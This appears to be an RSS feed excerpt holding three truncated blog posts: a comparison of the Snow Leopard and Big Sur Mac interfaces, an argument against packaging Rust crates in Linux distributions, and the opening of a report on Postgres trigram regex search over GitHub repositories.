<p><a href="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg"><img loading="lazy" src="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg?resize=960%2C720" alt="" width="960" height="720" srcset="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg?w=2016 2016w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg?resize=260%2C195 260w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg?resize=640%2C480 640w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg?resize=768%2C576 768w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg?resize=1536%2C1152 1536w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg?resize=1194%2C896 1194w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/02-SL-Welcome.jpg?w=1920 1920w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></a><br>
<em>Ah, When Mac OS welcomed you after the installation process was complete…</em></p>
<p>Since the MacBook Pro doesn’t have an optical drive anymore, I had to create a bootable USB flash drive from my original Snow Leopard DVD Installer. The fastest method is to use Disk Utility — rather, an older version of Disk Utility, from a time when this application was <em>really</em> a utility, and you could use the Restore feature <em>reliably</em> to clone the bootable DVD to (in this case) an external volume.</p>
<p>From a bootable USB flash drive to another USB flash drive, installation was relatively fast, about 20–25 minutes. Although I would have preferred an external SSD for the speed, I must say that using Snow Leopard from the flash drive is a breeze nonetheless. The system is responsive and I haven’t noticed any particular lags.</p>
<h2>User interface</h2>
<p>Now let’s examine just a few aspects of Snow Leopard’s user interface — just like I did for Big Sur in my logbook — and draw comparisons with Big Sur’s interface.</p>
<h3>The menu&nbsp;bar</h3>
<p>Back in August 2020 when I started testing the first Big Sur beta versions, <a href="http://morrick.me/archives/8954">I wrote in my Big Sur logbook</a>:</p>
<blockquote><p>In Big Sur, the menu bar by default isn’t solid white, but has a noticeable degree of transparency: it takes the colour of the desktop wallpaper behind it, in an attempt to blend in with the rest of the desktop environment. Some may consider this sleek, but it’s just gimmicky and usability-hostile.</p>
<p>What happens when the desktop wallpaper has darker colours? Well, menu items and menu bar icons become white, of course. The problem is that the wallpaper doesn’t have to be too&nbsp;dark.</p></blockquote>
<p>In other words, when Big Sur decides that the desktop background image is dark enough, text and icons on the menu bar become white. The problem is that there are cases where the background colour simply <em>isn’t</em> dark enough to warrant a change from black text and icons to white text and icons. Consequently, the contrast is too poor. The only option for better usability is to select <em>Reduce transparency</em> in <em>System Preferences</em> → <em>Accessibility</em>. This brings the menu bar back to a useful state, solid white with black elements.</p>
<p>In Snow Leopard, the menu bar has transparency set to <em>on</em> by default, but it’s definitely more subtle, even with darker desktop backgrounds:</p>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/03-subtle-menubar-transparency.png"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/03-subtle-menubar-transparency.png?resize=960%2C500" alt="" width="960" height="500" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/03-subtle-menubar-transparency.png?w=1440 1440w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/03-subtle-menubar-transparency.png?resize=260%2C135 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/03-subtle-menubar-transparency.png?resize=640%2C333 640w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/03-subtle-menubar-transparency.png?resize=768%2C400 768w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/03-subtle-menubar-transparency.png?resize=1194%2C622 1194w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></a></p>
<p><em>In the top image, menu bar transparency is off; in the bottom image, transparency is on. The difference is almost negligible.</em></p>
<p>Only with certain background images that contain dark and light areas starkly juxtaposed can menu bar transparency become a bit of an issue under Snow Leopard, but that is partly mitigated by the visible drop shadow beneath the menu bar itself, which helps to make the menu bar stand out&nbsp;more:</p>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/04-menubar-translucency-on.png"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/04-menubar-translucency-on.png?resize=960%2C672" alt="" width="960" height="672" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/04-menubar-translucency-on.png?w=1000 1000w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/04-menubar-translucency-on.png?resize=260%2C182 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/04-menubar-translucency-on.png?resize=640%2C448 640w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/04-menubar-translucency-on.png?resize=768%2C538 768w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></a></p>
<p>Contrast, even in these conditions, tends to be more tolerable than in Big Sur, at least for my eyes. And in any case, in Snow Leopard you can quickly turn off transparency right in <em>System Preferences</em> → <em>Desktop <span>&amp;</span> Screen Saver:</em></p>
<p><a href="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/05-Desktop-SSaver.png"><img loading="lazy" src="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/05-Desktop-SSaver.png?resize=748%2C658" alt="" width="748" height="658" srcset="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/05-Desktop-SSaver.png?w=748 748w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/05-Desktop-SSaver.png?resize=260%2C229 260w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/05-Desktop-SSaver.png?resize=640%2C563 640w" sizes="(max-width: 748px) 100vw, 748px" data-recalc-dims="1"></a></p>
<p><em>I’ve been talking about ‘transparency’, whereas it’s actually ‘translucency’ — at least in Snow Leopard.</em></p>
<h3>Finder windows</h3>
<p>In Snow Leopard, Finder windows are essentially perfect from a user interface standpoint.</p>
<p><a href="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/06-Finder-Window.png"><img loading="lazy" src="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/06-Finder-Window.png?resize=850%2C558" alt="" width="850" height="558" srcset="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/06-Finder-Window.png?w=850 850w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/06-Finder-Window.png?resize=260%2C171 260w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/06-Finder-Window.png?resize=640%2C420 640w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/06-Finder-Window.png?resize=768%2C504 768w" sizes="(max-width: 850px) 100vw, 850px" data-recalc-dims="1"></a></p>
<p>When I shared this over Twitter, Mario Guzmán <a href="https://twitter.com/MarioGuzman/status/1360651998358425601?s=20">observed</a> that <em>Things are nicely compartmentalized by color. You can distinctly tell each section of the window (even the damn scroll bars)… it’s not just one blob of white with grey symbols.</em></p>
<p>Exactly this. The window has clearly distinguishable areas: the <em>Title bar</em> (with the semaphore controls at the top left of the window, and the sidebar+toolbar show/hide toggle button at the top right), the <em>Toolbar</em>, the <em>Sidebar</em> (with colourful icons helping you quickly and easily locate items at a glance), the <em>Path bar</em>, the <em>Status bar</em>, and finally the <em>scroll bars</em> which are always visible.</p>
<p>Persistent up/down arrows and scroll bars are the right thing to do, usability-wise, and it is such a user-friendly design. The length of the ‘aqua blue’ bar immediately gives you an idea of how populated that folder you just opened is going to be. Further, if you need to rapidly scroll down, you just grab the bar with the mouse pointer and scroll.</p>
<p>In later Mac OS versions, scroll bars are set by default to appear only based on mouse/trackpad movement, which is a pity; many users probably don’t realise they can have scroll bars appear permanently, so they don’t have to time the mouseover action for the scroll bar to appear and then <em>hope</em> they’ll manage to grab it when they want to quickly scroll down a long list of elements.</p>
<p>I am once again reminded of that infamous quote by Alan Dye (Apple’s VP of Human Interface) from WWDC 2020, speaking of Big Sur’s UI redesign:&nbsp;<em>‌We’ve reduced visual complexity to keep the focus on users’ content. Buttons and controls appear when you need them, and they recede when you don’t.</em> I still believe this is not a good approach in general, and especially for essential elements like scroll bars, which should always be visible by default, because they are UI elements whose usefulness isn’t limited to when you use them or interact with them — they signal something even when not strictly needed. In the case of the scroll bars it’s a visual estimate of how many elements a folder contains, how long a list of items is, and more importantly <em>your current position</em> when scrolling.</p>
<p>Back to Finder windows, here’s an “Apple’s attention to detail” detail: notice that icon in the bottom left of the window? It is a subtle visual cue that tells you if Finder icons (items) are sorted, unsorted, or simply snapped to a grid. When opening windows from read-only volumes, the icon of a crossed-out pencil appears here, meaning that you can’t modify the enclosed items or write to that volume.</p>
<p><a href="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/07-Finder-window-arranged-none.png"><img loading="lazy" src="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/07-Finder-window-arranged-none.png?resize=850%2C558" alt="" width="850" height="558" srcset="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/07-Finder-window-arranged-none.png?w=850 850w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/07-Finder-window-arranged-none.png?resize=260%2C171 260w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/07-Finder-window-arranged-none.png?resize=640%2C420 640w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/07-Finder-window-arranged-none.png?resize=768%2C504 768w" sizes="(max-width: 850px) 100vw, 850px" data-recalc-dims="1"></a><br>
<em>Items are unsorted (Arranged by: None) — No icon in the bottom left corner</em></p>
<p><a href="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/08-Finder-window-sorted.png"><img loading="lazy" src="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/08-Finder-window-sorted.png?resize=850%2C558" alt="" width="850" height="558" srcset="https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/08-Finder-window-sorted.png?w=850 850w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/08-Finder-window-sorted.png?resize=260%2C171 260w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/08-Finder-window-sorted.png?resize=640%2C420 640w, https://i1.wp.com/morrick.me/wp-content/uploads/2021/02/08-Finder-window-sorted.png?resize=768%2C504 768w" sizes="(max-width: 850px) 100vw, 850px" data-recalc-dims="1"></a><br>
<em>Items are sorted (by name, size, kind,&nbsp;etc.)</em></p>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/09-Finder-window-snapgrid.png"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/09-Finder-window-snapgrid.png?resize=850%2C558" alt="" width="850" height="558" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/09-Finder-window-snapgrid.png?w=850 850w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/09-Finder-window-snapgrid.png?resize=260%2C171 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/09-Finder-window-snapgrid.png?resize=640%2C420 640w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/09-Finder-window-snapgrid.png?resize=768%2C504 768w" sizes="(max-width: 850px) 100vw, 850px" data-recalc-dims="1"></a><br>
<em>Items are snapped to&nbsp;grid</em></p>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/10-Finder-window-readonly-vol.png"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/10-Finder-window-readonly-vol.png?resize=752%2C521" alt="" width="752" height="521" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/10-Finder-window-readonly-vol.png?w=752 752w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/10-Finder-window-readonly-vol.png?resize=260%2C180 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/10-Finder-window-readonly-vol.png?resize=640%2C443 640w" sizes="(max-width: 752px) 100vw, 752px" data-recalc-dims="1"></a><br>
<em>Window from a read-only volume</em></p>
<p>While I don’t find this UI detail to be crucial, it is certainly nice to have, and an example of those little things that contributed to make the Mac’s interface great. As I said above, it reflected a certain attention to detail and overall thoughtfulness I’ve seen progressively fade away in later Mac OS releases.</p>
<h2>A look back at a few system apps, with occasional UI comparisons between Snow Leopard and Big&nbsp;Sur</h2>
<h3>Safari</h3>
<p>5.1.10 was the last version of Safari running on Mac OS X 10.6.8. Here are a few things I still prefer over the current Safari:</p>
<p><a href="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/11-Blue-progress-bar.png"><img loading="lazy" src="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/11-Blue-progress-bar.png?resize=845%2C92" alt="" width="845" height="92" srcset="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/11-Blue-progress-bar.png?w=845 845w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/11-Blue-progress-bar.png?resize=260%2C28 260w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/11-Blue-progress-bar.png?resize=640%2C70 640w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/11-Blue-progress-bar.png?resize=768%2C84 768w" sizes="(max-width: 845px) 100vw, 845px" data-recalc-dims="1"></a><br>
<em>The blue progress bar</em></p>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/12-RSS-button.png"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/12-RSS-button.png?resize=852%2C100" alt="" width="852" height="100" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/12-RSS-button.png?w=852 852w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/12-RSS-button.png?resize=260%2C31 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/12-RSS-button.png?resize=640%2C75 640w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/12-RSS-button.png?resize=768%2C90 768w" sizes="(max-width: 852px) 100vw, 852px" data-recalc-dims="1"></a><br>
<em>The RSS button (you could read RSS feeds with Safari)</em></p>
<p>Another detail I very much prefer in the older Safari over more recent versions of Safari is how the plus [+] button near the address bar works. Its placement makes its function rather unequivocal: <em>Add the current page to something</em>. As usual, tooltips are helpful:</p>
<p><a href="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/13-Plus-button-1.png"><img loading="lazy" src="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/13-Plus-button-1.png?resize=562%2C92" alt="" width="562" height="92" srcset="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/13-Plus-button-1.png?w=562 562w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/13-Plus-button-1.png?resize=260%2C43 260w" sizes="(max-width: 562px) 100vw, 562px" data-recalc-dims="1"></a></p>
<p>But what if I want to add this page to my Reading List? No worries, when you actually press the [+], a thoughtfully-designed sheet comes down, and you can put the current page exactly where you want: in your Reading List, in the Top Sites, or in your Bookmarks.</p>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/14-Plus-button-2.png"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/14-Plus-button-2.png?resize=960%2C267" alt="" width="960" height="267" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/14-Plus-button-2.png?w=1005 1005w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/14-Plus-button-2.png?resize=260%2C72 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/14-Plus-button-2.png?resize=640%2C178 640w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/14-Plus-button-2.png?resize=768%2C213 768w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></a></p>
<p>The other plus button, to open a new browser tab, is placed in such an obvious spot that you know what it does without even waiting for the tooltip to appear:</p>
<p><a href="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/15-Plus-button-3.png"><img loading="lazy" src="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/15-Plus-button-3.png?resize=960%2C110" alt="" width="960" height="110" srcset="https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/15-Plus-button-3.png?w=1374 1374w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/15-Plus-button-3.png?resize=260%2C30 260w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/15-Plus-button-3.png?resize=640%2C73 640w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/15-Plus-button-3.png?resize=768%2C88 768w, https://i2.wp.com/morrick.me/wp-content/uploads/2021/02/15-Plus-button-3.png?resize=1194%2C136 1194w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></a></p>
<p>Now, let’s take a quick look at the UI in Big Sur’s Safari:</p>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?resize=960%2C59" alt="" width="960" height="59" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?w=2560 2560w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?resize=260%2C16 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?resize=640%2C40 640w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?resize=768%2C47 768w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?resize=1536%2C95 1536w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?resize=2048%2C126 2048w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?resize=1194%2C74 1194w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/16-Safari-top-UI.png?w=1920 1920w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></a></p>
<p>At first glance, there’s only one plus button in the app’s chrome. Try to look at this UI with fresh eyes and guess …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://morrick.me/archives/9220">http://morrick.me/archives/9220</a></em></p>]]>
            </description>
            <link>http://morrick.me/archives/9220</link>
            <guid isPermaLink="false">hacker-news-small-sites-26231212</guid>
            <pubDate>Mon, 22 Feb 2021 21:57:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Against Packaging Rust Crates]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26230935">thread link</a>) | @zdw
<br/>
February 22, 2021 | https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html | <a href="https://web.archive.org/web/*/https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="against-packaging-rust-crates">

<p>Recently the discussion has once again come up around the notion of packaging Rust crates as
libraries in distributions. For example, taking a library like <cite>serde</cite> and packaging it to
an RPM. While I use RPM as the examples here it applies equally to other formats.</p>
<p>Proponents of crate packaging want all Rust applications to use the “distributions” versions of a crate.
This is to prevent “vendoring” or “bundling”. This is where an
application (such as 389 Directory Server) ships all of it’s sources, as well as the sources of
it’s Rust dependencies in a single archive. These sources may differ in version from the bundled
sources of other applications.</p>
<div id="packaging-crates-is-not-reinventing-cargo">
<h2>“Packaging crates is not reinventing Cargo”</h2>
<p>This is a common claim by advocates of crate packaging. However it is easily disproved:</p>
<p><em>If packaging is not reinventing cargo, I am free to use all of Cargo’s features without conflicts to distribution packaging.</em></p>
<p>The reality is that packaging crates <em>is</em> reinventing Cargo - but without all it’s features. Common
limitations are that Cargo’s exact version/less than requirements can not be used safely, or Cargo’s ability to
apply patches or uses sources from specific git revisions can not be used at all.</p>
<p>As a result, this hinders upstreams from using all the rich features within Cargo to comply with
distribution packaging limitations, or it will cause the package to hit exceptions in policy and
necesitate vendoring anyway.</p>
</div>
<div id="you-can-vendor-only-in-these-exceptional-cases">
<h2>“You can vendor only in these exceptional cases …”</h2>
<p>As noted, since packaging is reinventing Cargo, if you use features of Cargo that are unsupported
then you may be allowed to vendor depending on the distributions policy. However, this raises some
interesting issues itself.</p>
<p>Assume I have been using distribution crates for a period of time - then the upstream adds an exact version
or git revision requirement to a project or a dependency in my project. I now need to change my spec file and tooling to use vendoring
and all of the benefits of distribution crates no longer exists (because you can not have any dependency
in your tree that has an exact version rule).</p>
<p>If the upstream ‘un-does’ that change, then I need to roll back to distribution crates since
the project would no longer be covered by the exemption.</p>
<p>This will create review delays and large amounts of administrative overhead. It means pointless effort to swap between
vendored and distribution crates based on small upstream changes. This may cause packagers to avoid
certain versions or updates so that they do not need to swap between distribution methods.</p>
<p>It’s very likely that these “exceptional” cases will be very common, meaning that vendoring will be occuring.
This necesitates supporting vendored applications in distribution packages.</p>
</div>
<div id="you-don-t-need-to-package-the-universe">
<h2>“You don’t need to package the universe”</h2>
<p>Many proponents say that they have “already packaged most things”. For example in 389 Directory Server
of our 60 dependencies, only 2 were missing in Fedora (2021-02). However this overlooks the fact
that I do not want to package those 2 other crates just to move forward. I want to support 389 Directory Server
the <em>application</em> not all of it’s dependencies in a distribution.</p>
<p>This is also before we come to larger rust projects, such as Kanidm that has nearly 400 dependencies. The
likelihood that many of them are missing is high.</p>
<p>So you will need to package the universe. Maybe not all of it. But still a lot of it. It’s already
hard enough to contribute packages to a distribution. It becomes even harder when I need to submit 3, 10, or 100
more packages. It could be months before enough approvals were in place. It’s a staggering
amount of administration and work, which will discourage many contributors.</p>
<p>People have already contacted me to say that if they had to package crates to distribution packages to
contribute, they would give up and walk away. We’ve already lost future contributors.</p>
<p>Further to this Ruby, Python and many other languages today all recommend language native tools
such as rvm or virtualenv to avoid using distribution packaged libraries.</p>
<p>Packages in distributions should exist as a vehicle to ship bundled applications that are created
from their language native tools.</p>
</div>
<div id="we-will-update-your-dependencies-for-you">
<h2>“We will update your dependencies for you”</h2>
<p>A supposed benefit is that versions of crates in distributions will be updated in the background
according to semver rules.</p>
<p>If we had an exact version requirement (that was satisfiable), a silent background update will cause
this to no longer work - and will break the application from building. This would necesitate one of:</p>
<ul>
<li>A change to the Cargo.toml to remove the equality requirement - a requirement that may exist for good reason.</li>
<li>It will force the application to temporarily swap to vendoring instead.</li>
<li>The application will remain broken and unable to be updated until upstream resolves the need for the equality requirement.</li>
</ul>
<p>Background updates also ignore the state of your Cargo.lock file by removing it. A Cargo.lock file
is recommended to be checked in with binary applications in Rust, as evidence that shows “here is
an exact set of dependencies that upstream has tested and verified as building and working”.</p>
<p>To remove and ignore this file, means to remove the guarantees of quality from an upstream.</p>
<p>It is unlikely that packagers will run the entire test suite of an application to regain this
confidence. They will “apply the patch and pray” method - as they already do with other languages.</p>
<p>We can already see how background updates can have significant negative consequences on application stability. FreeIPA
has hundreds of dependencies, and it’s common that if any of them changes in small ways, it can cause
FreeIPA to fall over. This is not the fault of FreeIPA - it’s the fault of relying on so many small
moving parts that can change underneath your feet without warning. FreeIPA would strongly benefit from
vendoring to improve it’s stability and quality.</p>
<p>Inversely, it can cause hesitation to updating libraries - since there is now a risk of breaking
other applications that depend on them. We do not want people to be afraid of updates.</p>
</div>
<div id="we-can-respond-to-security-issues">
<h2>“We can respond to security issues”</h2>
<p>On the surface this is a strong argument, but in reality it does not hold up. The security issues
that face Rust are significantly different to that which affect C. In C it may be viable to patch
and update a dynamic library to fix an issue. It saves time because you only need to update and change
one library to fix everything.</p>
<p>Security issues are much rarer in Rust. When they occur, you will have to update and re-build all
applications depending on the affected library.</p>
<p>Since this rebuilding work has to occur, where the security fix is applied is irrelevant. This frees
us to apply the fixes in a different way to how we approach C.</p>
<p>It is better to apply the fixes in a consistent and universal manner. There <em>will</em> be applications
that are vendored due to vendoring exceptions, there is now duplicated work and different
processes to respond to both distribution crates, and vendored applications.</p>
<p>Instead all applications could be vendored, and tooling exists that would examine the Cargo.toml to
check for insecure versions (RustSec/cargo-audit does this for example). The Cargo.toml’s can be
patched, and applications tested and re-vendored. Even better is these changes could easily then be forwarded to
upstreams, allowing every distribution and platform to benefit from the work.</p>
<p>In the cases that the upstream can not fix the issue, then Cargo’s native patching tooling can
be used to supply fixes directly into vendored sources for rare situations requiring it.</p>
</div>
<div id="patching-20-vulnerable-crates-doesn-t-scale-we-need-to-patch-in-one-place">
<h2>“Patching 20 vulnerable crates doesn’t scale, we need to patch in one place!”</h2>
<p>A common response to the previous section is that the above process won’t scale as we need to find
and patch 20 locations compared to just one. It will take “more human effort”.</p>
<p>Today, when a security fix comes out, every distribution’s security teams will have to be made aware of
this. That means - OpenSUSE, Fedora, Debian, Ubuntu, Gentoo, Arch, and many more groups all have to
become aware and respond. Then each of these projects security teams will work with their maintainers
to build and update these libraries. In the case of SUSE and Red Hat this means that multiple developers
may be involved, quality engineering will be engaged to test these changes. Consumers of that library
will re-test their applications in some cases to ensure there are no faults of the components they
rely upon. This is all before we approach the fact that each of these distributions have many supported
and released versions they likely need to maintain so this process may be repeated for patching and
testing multiple versions in parallel.</p>
<p>In this process there are a few things to note:</p>
<ul>
<li>There is a huge amount of human effort today to keep on top of security issues in our distributions.</li>
<li>Distributions tend to be isolated and can’t share the work to resolve these - the changes to the rpm specs in SUSE won’t help Debian for example.</li>
<li>Human error occurs in all of these layers causing security issues to go un-fixed or breaking a released application.</li>
</ul>
<p>To suggest that rust and vendoring somehow makes this harder or more time consuming is discounting
the huge amount of time, skill, and effort already put in by people to keep our C based distributions functioning
today.</p>
<p>Vendored Rust won’t make this process easier or harder - it just changes the nature of the effort
we have to apply as maintainers and distributions. It shifts our focus from “how do we ensure this
library is secure” to “how do we ensure this <em>application</em> made from many libraries is secure”. It
allows further collaboration with upstreams to be involved in the security update process, which ends up
benefiting <em>all</em> distributions.</p>
</div>
<div id="it-doesn-t-duplicate-effort">
<h2>“It doesn’t duplicate effort”</h2>
<p>It does. By the very nature of both distribution libraries and vendored applications needing to
exist in a distribution, there will become duplicated but seperate processes and …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html">https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html</a></em></p>]]>
            </description>
            <link>https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26230935</guid>
            <pubDate>Mon, 22 Feb 2021 21:32:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Postgres regex search over 10k GitHub repositories (using only a MacBook)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26230879">thread link</a>) | @boyter
<br/>
February 22, 2021 | https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories | <a href="https://web.archive.org/web/*/https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In this article, we share empirical measurements from our experiments in using Postgres to index and search over 10,000 top GitHub repositories using <code>pg_trgm</code> on only a Macbook.</p>

<p>This is a follow up to <a href="https://devlog.hexops.com/2021/postgres-trigram-search-learnings">“Postgres Trigram search learnings”</a>, in which we shared several learnings and beliefs about trying to use Postgres Trigram indexes as an alterative to Google’s <a href="https://github.com/google/zoekt">Zoekt</a> (“Fast trigram based code search”).</p>

<p>We share our results, as well as <a href="https://github.com/hexops/pgtrgm_emperical_measurements">the exact steps we performed, scripts, and lists of the top 20,000 repositories by stars/language on GitHub</a> so you can reproduce the results yourself should you desire.</p>

<h2 id="tldr">TL;DR</h2>

<p><strong>This article is extensive and more akin to a research paper than a blog post.</strong> If you’re interested in our conclusions, see <a href="#conclusions">conclusions</a> instead.</p>

<h2 id="goals">Goals</h2>

<p>We wanted to get empirical measurements for how suitable Postgres is in providing regexp search over documents, e.g. as an alterative to Google’s <a href="https://github.com/google/zoekt">Zoekt</a> (“Fast trigram based code search”). In specific:</p>

<ul>
  <li>How many repositories can we index on just a 2019 Macbook Pro?</li>
  <li>How fast are different regexp searches over the corpus?</li>
  <li>What Postgres 13 configuration gives best results?</li>
  <li>What other operational effects need consideration if seriously attempting to use Postgres as the backend for a regexp search engine?</li>
  <li>What is the best database schema to use?</li>
</ul>

<h2 id="hardware">Hardware</h2>

<p>We ran all tests on a 2019 Macbook Pro with:</p>

<ul>
  <li>2.3 GHz 8-Core Intel Core i9</li>
  <li>16 GB 2667 MHz DDR4</li>
</ul>

<p>During test execution, few other Mac applications were in use such that effectively all CPU/memory was available to Postgres.</p>

<h2 id="corpus">Corpus</h2>

<p>We scraped <a href="https://github.com/hexops/pgtrgm_emperical_measurements/tree/main/top_repos">lists of the top 1,000 repositories from the GitHub search API</a> ranked by stars for each of the following languages (~20.5k repositories in total):</p>

<ul>
  <li>C++, C#, CSS, Go, HTML, Java, JavaScript, MatLab, ObjC, Perl, PHP, Python, Ruby, Rust, Shell, Solidity, Swift, TypeScript, VB .NET, and Zig.</li>
</ul>

<p>Cloning all ~20.5k repositories in parallel took ~14 hours with a fast ~100 Mbps connection to GitHub’s servers.</p>

<h3 id="dataset-reduction">Dataset reduction</h3>

<p>We found the amount of disk space required by <code>git clone --depth 1</code> on these repositories to be a sizable ~412G for just 12,148 repositories - and so we put in place several processes for further reduce the dataset size by about 66%:</p>

<ul>
  <li>Removing <code>.git</code> directories resulted in a 30% reduction (412G -&gt; 290G, for 12,148 repositories)</li>
